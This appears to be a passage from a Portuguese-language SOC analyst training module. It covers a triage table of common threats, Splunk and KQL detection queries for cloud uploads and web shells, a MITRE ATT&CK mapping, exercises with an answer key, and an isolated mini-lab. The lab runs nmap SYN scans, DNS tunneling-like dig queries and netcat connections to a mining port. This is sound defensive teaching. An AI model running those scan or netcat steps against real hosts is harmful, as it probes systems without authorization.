| Ransomware | "Volume anormal de renomeação de arquivos" | EDR, Windows 4663, logs de file server | Há shadow copies sendo apagadas? Quantos hosts afetados? | Sempre. Isolar host e escalar em minutos |
| Command and Control (C2) | "Beaconing detectado" | Zeek conn.log/ssl.log, firewall | Intervalo regular entre conexões? Destino tem reputação ruim? | Padrão periódico confirmado com destino não categorizado |
| DNS tunneling | "Volume anormal de queries TXT" | Zeek dns.log, servidor DNS interno | Subdomínios longos e aleatórios no mesmo domínio pai? | Mais de algumas centenas de queries ao mesmo domínio pai |
| Exfiltração | "Upload anormal para destino externo" | Proxy/CASB, firewall (bytes_out) | Volume comparado à média do usuário; destino é corporativo? | Volume alto para destino pessoal ou não categorizado |
| Movimento lateral | "Logon 4624 tipo 3 incomum" | Windows 4624/4648/4769, Sysmon 1 | Origem é estação de trabalho falando com muitos hosts? | Uma origem autenticando em vários destinos em pouco tempo |
| Brute force | "Muitos 4625 no mesmo usuário" | Windows Security 4625/4771, VPN | Houve 4624 de sucesso depois da rajada? | Sucesso após falhas, ou origem externa |
| Password spraying | "4625 em muitos usuários, mesma origem" | Windows 4625/4776, logs de VPN e portal | Quantos usuários distintos e de onde vem? | Sempre — indica lista de usuários conhecida |
| Insider | "Upload para instância pessoal" | CASB/Netskope, proxy, 4663 | Volume, horário e tipo de arquivo; pessoa em desligamento? | Dado sensível + destino não corporativo |
| Supply chain | "Binário assinado com destino incomum" | Sysmon 1/3, firewall | Houve janela de atualização? Outros hosts iguais? | Mais de um host com o mesmo comportamento |
| Credential stuffing | "Rate limit no endpoint de login" | WAF, logs da aplicação | Quantos usuários distintos? Algum sucesso? | Qualquer autenticação bem-sucedida na rajada |
| Cryptojacking | "Conexão a pool de mineração" | Zeek dns.log/conn.log, proxy | Qual processo abriu a conexão? CPU alta? | Sempre em servidor; em estação, após confirmar processo |
| DDoS | "Pico de sessões novas por segundo" | Firewall (ASA 302013/302014), balanceador | O serviço está degradado de fato? | Impacto real no serviço |
| SQLi / XSS | "WAF: SQL Injection Attempt" | WAF (FortiGate/Palo Alto THREAT) | Ação foi `reset-both`/`deny` ou passou com HTTP 200? | Request semelhante com HTTP 200, ou erro 500 em série |
| Web shell | "Processo filho de servidor web" | Sysmon 1, logs do IIS/Apache | `w3wp.exe`/`httpd` criando `cmd.exe`/`sh`? | Sempre. Comprometimento de servidor |

### Consultas de apoio

```spl
index=proxy sourcetype=netskope activity=Upload instance_id=personal
| stats sum(file_size) AS bytes_total, dc(object) AS arquivos BY user, app
| eval mb_total=round(bytes_total/1024/1024,1)
| where mb_total > 100
| sort - mb_total
```

Linha 1 filtra só uploads para instância pessoal. Linha 2 soma bytes e conta arquivos distintos por usuário e aplicativo. Linha 3 converte para MB. Linha 4 mantém só quem passou de 100 MB. Linha 5 ordena do maior para o menor.

```kql
// Processos filhos suspeitos de servidor web (indicio de web shell)
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","httpd.exe","nginx.exe","tomcat9.exe")
| where FileName in~ ("cmd.exe","powershell.exe","bash.exe","sh.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, AccountName
| order by Timestamp desc
```

Linha 2 seleciona eventos cujo processo pai é um servidor web. Linha 3 mantém só quando o filho é um interpretador de comandos. Linha 4 reduz às colunas úteis. Linha 5 ordena pelo mais recente.

## Mapeamento MITRE ATT&CK do módulo

MITRE ATT&CK é um catálogo público que dá um código a cada comportamento de atacante. Serve como idioma comum entre N1, N2 e threat intel.

| Ameaça do módulo | Tática | Técnica (ID) |
|---|---|---|
| Phishing | Initial Access | Phishing (T1566), Spearphishing Link (T1566.002) |
| Malware por anexo | Execution | User Execution: Malicious File (T1204.002) |
| Ataques web (SQLi, XSS) | Initial Access | Exploit Public-Facing Application (T1190) |
| Web shell | Persistence | Server Software Component: Web Shell (T1505.003) |
| Supply chain | Initial Access | Supply Chain Compromise (T1195) |
| Brute force | Credential Access | Brute Force (T1110) |
| Password spraying | Credential Access | Brute Force: Password Spraying (T1110.003) |
| Credential stuffing | Credential Access | Brute Force: Credential Stuffing (T1110.004) |
| Movimento lateral | Lateral Movement | Remote Services: SMB/Admin Shares (T1021.002), Remote Desktop (T1021.001) |
| Pass-the-hash / ticket | Lateral Movement | Use Alternate Authentication Material (T1550) |
| Command and Control | Command and Control | Application Layer Protocol: Web Protocols (T1071.001) |
| DNS tunneling | Command and Control | Application Layer Protocol: DNS (T1071.004), Protocol Tunneling (T1572) |
| Exfiltração para nuvem | Exfiltration | Exfiltration to Cloud Storage (T1567.002) |
| Insider levando dados | Collection / Exfiltration | Data from Information Repositories (T1213), Exfiltration Over Physical Medium (T1052) |
| Cryptojacking | Impact | Resource Hijacking (T1496) |
| Ransomware | Impact | Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490) |
| DDoS | Impact | Network Denial of Service (T1498), Endpoint Denial of Service (T1499) |

### Exercícios — Outras ameaças e a tabela mestra de triagem

1. No log do Cisco ASA acima, há 4.000 linhas parecidas em 60 segundos, todas com `duration 0:00:00` e `bytes 0`. Qual ameaça é essa e qual a primeira verificação segundo a tabela mestra?
2. Chegou um alerta de WAF: `action="detected"` para SQL Injection vindo de 198.51.100.61. O analista fechou como falso positivo porque "o WAF viu". Ele está certo? Justifique.
3. O usuário `jsilva` fez upload de 620 MB para `instance_id=personal` às 03h12. Ele é administrador de banco de dados e trabalha em turno noturno autorizado. Verdadeiro ou falso positivo? Qual o próximo passo?
4. Um servidor gerou Sysmon EventID 3 de `agent.exe` (assinado, de fornecedor) para `203.0.113.88:443` e, 30 minutos depois, outros 12 servidores fizeram o mesmo. Qual técnica MITRE se aplica e qual o critério de escalonamento?
5. Um host abre conexão TCP para `198.51.100.30:3333` a cada 45 segundos e resolveu antes `pool.mining-node.example.com`. Classifique a ameaça e diga qual código MITRE usar no ticket.

<details><summary>Ver gabarito</summary>

1. **DDoS (SYN flood ou flood de conexão).** A assinatura é sessão construída e derrubada sem nenhum byte transferido, em altíssimo volume. Pela tabela mestra, a primeira verificação é confirmar impacto real: o serviço em 10.20.5.10 está degradado ou fora do ar? Volume de pacotes sem impacto pode ser varredura; com impacto, é incidente de disponibilidade e escala na hora, acionando o provedor de mitigação.

2. **Não está certo.** `action="detected"` no FortiGate significa que o WAF viu e registrou, mas em modo de detecção — não necessariamente bloqueou (bloqueio apareceria como `action="blocked"`; no Palo Alto seria `reset-both` ou `deny`). Mesmo que tivesse bloqueado, a obrigação do N1 é checar se algum request semelhante do mesmo IP retornou HTTP 200 nos logs da aplicação. Fechar pelo campo de ação sem olhar o resultado é o erro júnior clássico.

3. **Provavelmente verdadeiro positivo, mesmo com turno noturno justificado.** O horário deixa de ser anomalia, mas o `instance_id=personal` continua sendo: destino não corporativo com 620 MB de dados. Próximo passo: identificar os nomes dos arquivos (o campo `object`), verificar se contêm dado pessoal ou base de clientes, checar com o gestor se há autorização, preservar os logs e escalar ao N2 com RH/Jurídico. O N1 não contata o usuário diretamente em suspeita de insider.

4. **T1195 — Supply Chain Compromise**, tática Initial Access. O critério de escalonamento da tabela mestra é exatamente esse: mais de um host com o mesmo comportamento. Um binário assinado e legítimo falando com um destino incomum pode ser configuração nova; treze hosts fazendo o mesmo indica que a atualização ou o próprio agente do fornecedor foi comprometido. Escalar e, em paralelo, verificar se houve janela de atualização declarada.

5. **Cryptojacking.** Porta 3333 é típica de protocolo Stratum de pool de mineração, o intervalo regular indica conexão persistente e a query DNS confirma. Código MITRE: **T1496 — Resource Hijacking**, tática Impact. Se preferir registrar também o canal, cabe T1071 para o tráfego, mas o código principal do ticket é T1496. Primeiro passo prático: identificar o processo pelo Sysmon EventID 1 no mesmo host e horário.

</details>

## Mini-laboratório — Ameaças comuns e triagem no SIEM

**Objetivo:** gerar e reconhecer, com suas próprias mãos, três rastros deste módulo — varredura/DDoS, tráfego DNS anômalo e conexão a porta de mineração.

**Pré-requisitos (tudo gratuito):**
- VirtualBox com duas VMs na mesma rede interna: uma Ubuntu (atacante-lab, 192.168.56.10) e uma Security Onion ou Ubuntu com Zeek e Suricata (sensor-lab, 192.168.56.20).
- Wireshark instalado no sensor.
- `nmap`, `tcpdump` e `dig` na VM Ubuntu.
- Rede isolada. Nunca aponte nenhum comando para host fora do laboratório.

**Passo 1 — capturar.** No sensor: `sudo tcpdump -i enp0s8 -w /tmp/lab-modulo14.pcap`. Deixe rodando.

**Passo 2 — varredura (rastro de reconhecimento/flood).** Na VM atacante: `nmap -sS -p 1-1000 192.168.56.20`. O que observar: no Wireshark, filtro `tcp.flags.syn == 1 && tcp.flags.ack == 0` mostra centenas de SYN sem resposta ou com RST. É o mesmo padrão do `duration 0:00:00 / bytes 0` do ASA.

**Passo 3 — DNS anômalo.** Na atacante, rode dez vezes: `dig @192.168.56.20 aaaabbbbccccddddeeeeffff.lab.example.com TXT`. O que observar: em `dns.log` do Zeek, `qtype_name=TXT` com `query` longa repetida no mesmo domínio pai — o formato que denuncia tunelamento de DNS.

**Passo 4 — porta de mineração.** No sensor: `sudo nc -l -p 3333`. Na atacante: `nc 192.168.56.20 3333` e digite qualquer texto. O que observar: em `conn.log` do Zeek, `id.resp_p=3333` com `service` vazio e conexão longa — o padrão de cryptojacking.

**Passo 5 — ler os alertas.** Pare o tcpdump (Ctrl+C) e rode `sudo zeek -r /tmp/lab-modulo14.pcap` numa pasta vazia. Abra `conn.log` e `dns.log` gerados. Se estiver no Security Onion, confira também os alertas do Suricata em `eve.json`.

**Critério de sucesso:** você consegue apontar, em cada arquivo de log, a linha exata que corresponde a cada um dos três passos, e escrever para cada uma a coluna "primeira verificação" da tabela mestra.

## O que um SOC Level 1 realmente precisa saber

- 🟢 Toda triagem começa com as mesmas quatro perguntas: quem, o quê, quando e o alerta foi bloqueado ou passou.
- 🟢 Saber a fonte de log primária de cada ameaça — Windows Security para autenticação, Zeek/firewall para rede, proxy/CASB para nuvem, WAF para aplicação.
- 🟢 Windows Event ID 4624 (logon com sucesso), 4625 (falha), 4768/4769 (tickets Kerberos), 4776 (NTLM) e 4688 (criação de processo) são a base da triagem de identidade.
- 🟢 Sysmon 1 (processo), 3 (conexão de rede) e 22 (consulta DNS) ligam o que acontece na rede ao que acontece no endpoint.
- 🟢 "Bloqueado" não é o fim da análise: sempre verifique se um request ou conexão parecida teve sucesso.
- 🟢 Ransomware, web shell e password spraying escalam sempre, sem debate.
- 🟡 Beaconing se reconhece pela regularidade do intervalo, não pelo volume.
- 🟡 Volume de upload só significa algo comparado à linha de base daquele usuário.
- 🟡 Distinguir brute force, password spraying e credential stuffing muda completamente a resposta.
- 🟡 Insider é caso sensível: documente, preserve e escale — não investigue por conta própria nem contate o usuário.
- 🔴 Correlacionar múltiplos hosts com o mesmo comportamento é o que separa ruído de campanha (supply chain, C2, worm).
- 🔴 Traduzir cada achado para um código MITRE ATT&CK deixa o ticket pronto para o N2 e para o threat intel.

## Resumo em 10 linhas

1. Este módulo cobriu as ameaças que um SOC N1 encontra no dia a dia e o rastro que cada uma deixa em log.
2. Phishing e malware são a porta de entrada mais comum; o clique e a execução são os dois momentos que importam.
3. Ransomware, Command and Control e DNS tunneling representam a fase em que o atacante já está dentro e mantém controle.
4. Exfiltração, movimento lateral, brute force e password spraying mostram o atacante se espalhando e roubando.
5. Insider, supply chain, credential stuffing, cryptojacking, DDoS e ataques web completam o catálogo do plantão.
6. Cada ameaça tem uma fonte de log primária: identidade no Windows Security, rede no Zeek e no firewall, nuvem no proxy/CASB, aplicação no WAF.
7. A tabela mestra de triagem transforma tudo isso em cinco colunas práticas, do alerta ao critério de escalonamento.
8. O erro júnior mais caro é fechar alerta bloqueado sem checar se algo parecido passou.
9. O mapeamento MITRE ATT&CK dá nome padronizado ao comportamento e melhora a qualidade do ticket escalado.
10. Triagem boa não é decorar assinatura: é conhecer o normal do seu ambiente e saber o que perguntar primeiro.



---
